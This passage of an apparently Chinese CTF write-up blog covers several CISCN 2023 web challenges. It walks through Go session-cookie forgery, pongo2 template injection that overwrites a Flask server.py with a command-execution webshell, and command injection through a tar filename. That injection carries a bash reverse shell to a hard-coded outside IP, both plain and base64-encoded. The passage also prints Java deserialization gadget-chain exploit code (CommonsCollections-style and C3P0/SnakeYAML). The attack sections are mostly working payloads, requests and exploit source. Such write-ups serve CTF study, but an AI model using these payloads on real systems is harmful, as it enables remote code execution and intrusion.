	r.GET(<span class="hljs-string">"/admin"</span>, route.Admin)
	r.GET(<span class="hljs-string">"/flask"</span>, route.Flask)
	r.Run(<span class="hljs-string">"0.0.0.0:80"</span>)
}</code></pre>
<p>index路由的处理</p>
<pre><code class="hljs go"><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">"SESSION_KEY"</span>)))

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(c *gin.Context)</span></span> {
	session, err := store.Get(c.Request, <span class="hljs-string">"session-name"</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">"name"</span>] == <span class="hljs-literal">nil</span> {
		session.Values[<span class="hljs-string">"name"</span>] = <span class="hljs-string">"guest"</span>
		err = session.Save(c.Request, c.Writer)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
			<span class="hljs-keyword">return</span>
		}
	}

	c.String(<span class="hljs-number">200</span>, <span class="hljs-string">"Hello, guest"</span>)
}</code></pre>
<p>首先是靠SESSION_KEY环境变量的key对session加密，接着判断session中的name键值是否为空，如果是空的话，赋值为guest。但不论name值如何，这里最后回显都是Hello, guest</p>
<p>Admin路由：</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Admin</span><span class="hljs-params">(c *gin.Context)</span></span> {
	session, err := store.Get(c.Request, <span class="hljs-string">"session-name"</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">"name"</span>] != <span class="hljs-string">"admin"</span> {
		http.Error(c.Writer, <span class="hljs-string">"N0"</span>, http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}
	name := c.DefaultQuery(<span class="hljs-string">"name"</span>, <span class="hljs-string">"ssti"</span>)
	xssWaf := html.EscapeString(name)<span class="hljs-comment">//防止xss</span>
	tpl, err := pongo2.FromString(<span class="hljs-string">"Hello "</span> + xssWaf + <span class="hljs-string">"!"</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-built_in">panic</span>(err)
	}
	out, err := tpl.Execute(pongo2.Context{<span class="hljs-string">"c"</span>: c})
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}
	c.String(<span class="hljs-number">200</span>, out)
}</code></pre>
<p>这里判断session的name是否为admin，如果不是则返回500，之后获取url中name的值，如果没有则默认为ssti</p>
<p>之后通过pongo2框架进行渲染</p>
<p>Flask路由</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Flask</span><span class="hljs-params">(c *gin.Context)</span></span> {
	session, err := store.Get(c.Request, <span class="hljs-string">"session-name"</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">"name"</span>] == <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			http.Error(c.Writer, <span class="hljs-string">"N0"</span>, http.StatusInternalServerError)
			<span class="hljs-keyword">return</span>
		}
	}
	resp, err := http.Get(<span class="hljs-string">"http://127.0.0.1:5000/"</span> + c.DefaultQuery(<span class="hljs-string">"name"</span>, <span class="hljs-string">"guest"</span>))
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">defer</span> resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	c.String(<span class="hljs-number">200</span>, <span class="hljs-type">string</span>(body))
}</code></pre>
<p>判断session的name是否为空，如果为空则返回500；之后向本地的5000端口发送get请求，最后将响应的信息输出</p>
<h2 id="session伪造">session伪造</h2>
<p>我们需要进行伪造的原因是，只有session中的name值为admin的时候我们才能利用pongo2的ssti漏洞进行rce</p>
<p>经过wp的参考：由于没有找到session-key泄露的点，因此会尝试去爆破key或者猜测从key就是空。</p>
<p>这里他们猜测为空的原因是：<strong>试了一会发现 <code>os.Getenv</code> 如果获取不存在的环境变量就会返回空值</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302183654650.png" alt="image-20240302183654650"></p>
<p>这里可以做出如上图所示的修改，随后运行，在F12中找到cookie</p>
<pre><code class="hljs scss">MTcwOTM3NTc4NHxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXw8FvDB_aTI-<span class="hljs-number">00</span>gfsWKaEOxC_DgmOTwM0DX2_DSD_NxBQ==</code></pre>
<p>之后我们复制cookie覆盖原有数据包中的cookie即可，如下图成功伪造</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302183729913.png" alt="image-20240302183729913"></p>
<p>接下来访问flask路由，这里师傅们是对flask的name进行畸形传参而引发报错（但我不太懂为何）这里将name赋值为空即可报错</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302184014372.png" alt="image-20240302184014372"></p>
<p>将报错的源码，复制到一个html上打开即可，如下图找到对应的app源码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302184235328.png" alt="image-20240302184235328"></p>
<p>注意到这里debug开启了，根据师傅们所说：这就表明，Flask框架是热加载的，server.py发生改变，程序也会更新，可以利用admin路由执行Go代码去覆盖掉server.py实现rce，XssWaf会转义双引号，可以通过UA和Referer绕过传参</p>
<p>我们知道pongo2模板引擎存在注入点，可以执行go的代码，<a target="_blank" rel="noopener" href="http://xn--server-9o7il2da3e1ftwn5utlksk9cpva595b329e9gxd.py">所以我们可以先上传文件覆盖server.py</a>，再访问<code>/flask</code>路由，来执行命令</p>
<h2 id="构造payload">构造payload</h2>
<p>这里就是知识盲区了。。。</p>
<p>使用gin包的SaveUploadedFile()进行文件上传</p>
<pre><code class="hljs scss">func (c *Context) <span class="hljs-built_in">SaveUploadedFile</span>(file *multipart.FileHeader, dst string) error</code></pre>
<ul>
<li>第一个获取表单中的文件，第二个参数为保存的目录</li>
</ul>
<p>所以使用ssti的payload为</p>
<pre><code class="hljs scss">{{c<span class="hljs-selector-class">.SaveUploadedFile</span>(c.FormFile("file"),"/app/server<span class="hljs-selector-class">.py</span>")}}</code></pre>
<p>但是我们在前面代码审计的时候知道，双引号会被html.EscapeString转义进行编码，所以需要绕过</p>
<p>我们利用gin中的Context.HandlerName()</p>
<blockquote>
<p>HandlerName<br>
返回主处理程序的名称。例如，如果处理程序是“handleGetUsers()”，此函数将返回“main.handleGetUsers”</p>
</blockquote>
<p>所以如果是在Admin()里，返回的就是main/route.Admin，然后配合过滤器last获取到最后一个字符串也就是文件名为n</p>
<p>还有一个Context.Request.Referer()Request.Referer：返回header里的Referer的值</p>
<p>我们可以在请求中的Referer的值添加为/app/server.py，所以构造最终payload</p>
<pre><code class="hljs scss">{{c<span class="hljs-selector-class">.SaveUploadedFile</span>(c.FormFile(c.HandlerName()|last),c<span class="hljs-selector-class">.Request</span><span class="hljs-selector-class">.Referer</span>())}</code></pre>
<p>但是在数据包中添加请求头时还要添加 Content-Type 头</p>
<pre><code class="hljs scss"><span class="hljs-attribute">Content</span>-Type: multipart/form-data; boundary=--<span class="hljs-attr">--WebKitFormBoundary8ALIn5Z2C3VlBqND</span></code></pre>
<p>对于添加这个头的解释是</p>
<blockquote>
<p>对表单提交，浏览器会自动设置合适的 Content-Type 请求，同时 生成一个唯一的边界字符串，并在请求体中使用这个边界字符串将表单字段和文件进行分隔。如果表单中包含文件上传的功能，需要 使用 multipart/form-data 类型的请求体格式。</p>
</blockquote>
<p>注意分隔符的开始和结束格式</p>
<pre><code class="hljs scss">--分隔符
...
...
--分隔符--</code></pre>
<p><a target="_blank" rel="noopener" href="http://xn--server-2d7o590j.py">覆盖server.py</a>，访问./admin，数据包如下</p>
<pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/admin?name={{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}}</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node5.anna.nssctf.cn:28661
<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>/app/server.py
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session-name=MTcwOTM3NTc4NHxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXw8FvDB_aTI-00gfsWKaEOxC_DgmOTwM0DX2_DSD_NxBQ==
<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>423

<span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8ALIn5Z2C3VlBqND</span></span>
<span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>="n"; filename="1.py"</span>
<span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span>
<span class="language-pgsql"></span>
<span class="language-pgsql"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *</span>
<span class="language-pgsql"><span class="hljs-keyword">import</span> os</span>
<span class="language-pgsql">app = Flask(__name__)</span>
<span class="language-pgsql"></span>
<span class="language-pgsql">@app.route(<span class="hljs-string">'/'</span>)</span>
<span class="language-pgsql">def <span class="hljs-keyword">index</span>():</span>
<span class="language-pgsql">    <span class="hljs-type">name</span> = request.args[<span class="hljs-string">'name'</span>]</span>
<span class="language-pgsql">    file=os.popen(<span class="hljs-type">name</span>).<span class="hljs-keyword">read</span>()</span>
<span class="language-pgsql">    <span class="hljs-keyword">return</span> file</span>
<span class="language-pgsql"></span>
<span class="language-pgsql"><span class="hljs-keyword">if</span> __name__ == "__main__":</span>
<span class="language-pgsql">    app.run(host="0.0.0.0", port=<span class="hljs-number">5000</span>, <span class="hljs-keyword">debug</span>=<span class="hljs-keyword">True</span>)</span>
<span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8ALIn5Z2C3VlBqND--</span></span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302185908905.png" alt="image-20240302185908905"></p>
<p>成功上传，然后就在<code>./flask</code>去命令执行，因为我们知道该路由获取name是c.DefaultQuery，因此需要构造</p>
<pre><code class="hljs scss">?name=?name=env<span class="hljs-comment">//这样拼接以后才是http://127.0.0.1:5000/?name=env</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302190036705.png" alt="image-20240302190036705"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/134261219">[CISCN 2023 初赛]go_session</a></p>
<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/2304996.html">2023 CISCN 初赛 Web Writeup</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/V3g3t4ble/p/17515493.html">[CISCN 2023 初赛]go_session</a></p>
<h1 id="ciscn-2023-华北pysym">[CISCN 2023 华北]pysym</h1>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, send_from_directory
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> string
app = Flask(__name__)
app.config[<span class="hljs-string">'UPLOAD_FOLDER'</span>]=<span class="hljs-string">'uploads'</span> <span class="hljs-comment">#定义上传路径</span>
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span>, methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>)
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span>,methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>():
    <span class="hljs-comment">#判断是否有文件存在</span>
    <span class="hljs-keyword">if</span> <span class="hljs-string">'file'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'No file uploaded.'</span>
    file = request.files[<span class="hljs-string">'file'</span>]
    <span class="hljs-comment">#判断文件大小</span>
    <span class="hljs-keyword">if</span> file.content_length &gt; <span class="hljs-number">10240</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'file too lager'</span>
    <span class="hljs-comment">#生成上传路径</span>
    path = <span class="hljs-string">''</span>.join(random.choices(string.hexdigits, k=<span class="hljs-number">16</span>))
    <span class="hljs-comment">#生成最终上传路径,拼接uploads</span>
    directory = os.path.join(app.config[<span class="hljs-string">'UPLOAD_FOLDER'</span>], path)
    <span class="hljs-comment">#创建文件夹</span>
    os.makedirs(directory, mode=<span class="hljs-number">0o755</span>, exist_ok=<span class="hljs-literal">True</span>)
    <span class="hljs-comment">#生成最终文件的保存路径</span>
    savepath=os.path.join(directory, file.filename)
    file.save(savepath)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment">#对指定文件解压到指定目录</span>
     os.system(<span class="hljs-string">'tar --absolute-names  -xvf {} -C {}'</span>.<span class="hljs-built_in">format</span>(savepath,directory))
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'something wrong in extracting'</span>

    links = []
    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(directory):
        <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> files:
            extractedfile =os.path.join(root, name)
            <span class="hljs-comment">#检查是否存在符号链接</span>
            <span class="hljs-keyword">if</span> os.path.islink(extractedfile):
                os.remove(extractedfile)
                <span class="hljs-keyword">return</span> <span class="hljs-string">'no symlink'</span>
            <span class="hljs-comment">#检查是否为目录</span>
            <span class="hljs-keyword">if</span>  os.path.isdir(path) :
                <span class="hljs-keyword">return</span> <span class="hljs-string">'no directory'</span>
            links.append(extractedfile)
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>,links=links)
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/uploads/&lt;path:path&gt;"</span>,methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">path</span>):
    <span class="hljs-comment">#下载文件</span>
    filepath = os.path.join(app.config[<span class="hljs-string">'UPLOAD_FOLDER'</span>], path)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(filepath):
        <span class="hljs-keyword">return</span> <span class="hljs-string">'404'</span>, <span class="hljs-number">404</span>
    <span class="hljs-keyword">return</span> send_from_directory(app.config[<span class="hljs-string">'UPLOAD_FOLDER'</span>], path)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>,port=<span class="hljs-number">1337</span>)</code></pre>
<p>经分析，上述的<code>os.system('tar --absolute-names  -xvf {} -C {}'.format(savepath,directory))</code></p>
<p>这一处代码的savepath可控，可造成rce</p>
<p>先通过 <strong>|</strong> 连接符号绕过，再用反弹指令进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=base64%E7%BC%96%E7%A0%81&amp;spm=1001.2101.3001.7020">base64编码</a>绕过一些特殊字符的过滤。</p>
<pre><code class="hljs bash">test.tar | <span class="hljs-built_in">echo</span> bash -c <span class="hljs-string">'bash -i &gt;&amp; /dev/tcp/124.220.233.26/8888  0&gt;&amp;1'</span> | <span class="hljs-built_in">base64</span> -d | bash |
<span class="hljs-comment">#base64编码</span>
test.tar | <span class="hljs-built_in">echo</span> YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi84ODg4ICAwPiYxJw== | <span class="hljs-built_in">base64</span> -d | bash |</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302202119148.png" alt="image-20240302202119148"></p>
<p>发送之前记得开启监听</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302202133493.png" alt="image-20240302202133493"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/NYG694/article/details/136057868">CISCN往届国赛复现</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44558805/article/details/131456350">ciscn2023华北赛区</a></p>
<h1 id="ciscn-2023-初赛deserbug">[CISCN 2023 初赛]DeserBug</h1>
<p>找了几篇文章，都是基本直接给出答（都是老手了，不屑于），Java没做过几次，就是个菜鸟，这里下去补，直接给出答案了，今后学会再说。</p>
<p>这道题是Java经典CC链的翻版：</p>
<pre><code class="hljs java"><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;

<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
<span class="hljs-keyword">import</span> java.util.Base64;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> com.app.Tools.getBytes;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> com.app.Tools.setFieldValue;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> com.app.Tools.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">POC</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">byte</span>[] bytes = getBytes(<span class="hljs-string">"Evil"</span>);
        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();
        setFieldValue(templates, <span class="hljs-string">"_name"</span>, <span class="hljs-string">"Sentiment"</span>);
        setFieldValue(templates, <span class="hljs-string">"_class"</span>, <span class="hljs-literal">null</span>);
        setFieldValue(templates, <span class="hljs-string">"_bytecodes"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]{bytes});

        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();
        myexpect.setTargetclass(TrAXFilter.class);
        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Templates.class});
        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{templates});

        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();

        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>);
        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span>  <span class="hljs-operator">=</span> LazyMap.decorate(jsonObject,transformer);
        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap , <span class="hljs-string">"Sentiment"</span>);

        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();
        hashMap.put(tiedMapEntry, <span class="hljs-string">"1"</span>);

        jsonObject.remove(<span class="hljs-string">"Sentiment"</span>);
        setFieldValue(transformer,<span class="hljs-string">"iConstant"</span>,myexpect);

        <span class="hljs-type">byte</span>[] serialize = serialize(hashMap);
        System.out.println(Base64.getEncoder().encodeToString(serialize));
        <span class="hljs-comment">//unserialize(serialize);</span>
    }
}</code></pre>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/#deserbug">2023 CISCN 初赛 Web Writeup</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54902210/article/details/130956079">[CISCN 2023]—DeserBug</a></p>
<h1 id="ciscn-2023-西南dataapi">[CISCN 2023 西南]dataapi</h1>
<p>决赛题目，看不懂，发布wp的人也少，留着吧，┭┮﹏┭┮</p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/06/13/ciscn%E8%A5%BF%E5%8D%97%E5%A4%8D%E8%B5%9Bawdp-web/">CISCN西南复赛AWDPlus Web</a></p>
<h1 id="ciscn-2023-华北normal_snake">[CISCN 2023 华北]normal_snake</h1>
<p>又是Java反序列化，看不懂。。。考的是C3P0利用链：EXP如下</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main2</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] data;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">//URLClassLoader</span>
        <span class="hljs-type">C3P0DataSource</span> <span class="hljs-variable">c3P0DataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">C3P0DataSource</span>();

        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase"</span>);
        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();
        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);
        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">poolBackedDataSourceBase</span> <span class="hljs-operator">=</span> (PoolBackedDataSourceBase)declaredConstructor.newInstance();
        setFieldValue(<span class="hljs-string">"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase"</span>,poolBackedDataSourceBase,<span class="hljs-string">"connectionPoolDataSource"</span>,c3P0DataSource);

        serialize(poolBackedDataSourceBase);
        <span class="hljs-comment">//unserialize();</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">hexAscii</span> <span class="hljs-operator">=</span> ByteUtils.toHexAscii(data);
        System.out.println(hexAscii);
        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">"!&lt;tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&gt; {userOverridesAsString: \"HexAsciiSerializedMap:"</span> +hexAscii+ <span class="hljs-string">";\"}"</span>;
        System.out.println(poc);
        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();
        <span class="hljs-comment">//yaml.load(poc);</span>
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(String className,Object object, String field_name, Object field_value)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(className);
        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(field_name);
        declaredField.setAccessible(<span class="hljs-literal">true</span>);
        declaredField.set(object,field_value);
    }
